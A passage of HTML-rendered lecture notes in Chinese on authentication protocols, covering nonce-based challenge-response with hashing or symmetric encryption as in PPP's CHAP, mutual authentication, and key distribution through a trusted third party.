style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿分别标识通信双方</li><li>详细步骤：<ul><li>B生成﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">R_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿并发送﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>I</mi><msub><mi>D</mi><mi>B</mi></msub><mo separator="true">,</mo><msub><mi>R</mi><mi>B</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(ID_B, R_B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿给A</li><li>A使用﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">R_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿生成秘密﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿（通过哈希或加密）</li><li>A发送﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>I</mi><msub><mi>D</mi><mi>A</mi></msub><mo separator="true">,</mo><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(ID_A, K_{AB})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿给B进行验证</li></ul></li><li>验证方式：<ul><li>哈希算法：B本地计算﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>=</mo><mi>H</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msub><mi>R</mi><mi>B</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K&#x27;_{AB}=Hash(key||R_B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.027223em;vertical-align:-0.275331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.424669em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.275331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿进行比对</li><li>对称加密：B用密钥解密<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿验证﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">R_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿正确性</li></ul></li><li>安全机制：<ul><li>防重放：每次认证使用不同随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">R_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>密钥保护：共享密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>﻿始终不直接传输</li></ul></li><li>典型应用：PPP协议中的CHAP认证（三次握手过程）</li><li>生成方式：<ul><li>哈希生成：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub><mo>=</mo><mi>H</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mi>K</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msub><mi>R</mi><mi>B</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_{AB}=Hash(K||R_B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿（如HMAC）</li><li>加密生成：﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub><mo>=</mo><msub><mi>E</mi><mi>K</mi></msub><mo stretchy="false">(</mo><msub><mi>R</mi><mi>B</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_{AB}=E_K(R_B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿（对称加密）</li></ul></li></ul></li></ul></li><li><p>双向认证：验证者与声称者在认证过程中互相鉴别彼此身份</p></li><li><p>第三方认证</p><ul><li><p>核心要素: 包含客户端A、服务端B和可信第三方TTP（Trusted Third Party）</p></li><li><p>密钥体系:</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>P</mi><mi>A</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{PA}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿: A与第三方P的共享密钥</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>P</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{PB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿: B与第三方P的共享密钥</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿: A与B的通信密钥</li></ul></li><li><p>典型应用: 微信/手机号实名认证（运营商充当TTP）</p></li><li><p>认证流程：</p><ul><li>初始请求:<ul><li>A→P: 发送﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>P</mi><mi>A</mi></mrow></msub><mo stretchy="false">(</mo><mi>I</mi><msub><mi>D</mi><mi>B</mi></msub><mo separator="true">,</mo><msub><mi>R</mi><mi>A</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_{PA}(ID_B, R_A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿加密消息</li><li>包含目标B的标识和随机数﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">R_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul></li><li>第三方处理:<ul><li>P解密后生成：<ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>P</mi><mi>A</mi></mrow></msub><mo stretchy="false">(</mo><msub><mi>R</mi><mi>A</mi></msub><mo separator="true">,</mo><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_{PA}(R_A, K_{AB})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿（A可解密）</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>P</mi><mi>B</mi></mrow></msub><mo stretchy="false">(</mo><mi>I</mi><msub><mi>D</mi><mi>A</mi></msub><mo separator="true">,</mo><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_{PB}(ID_A, K_{AB})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span 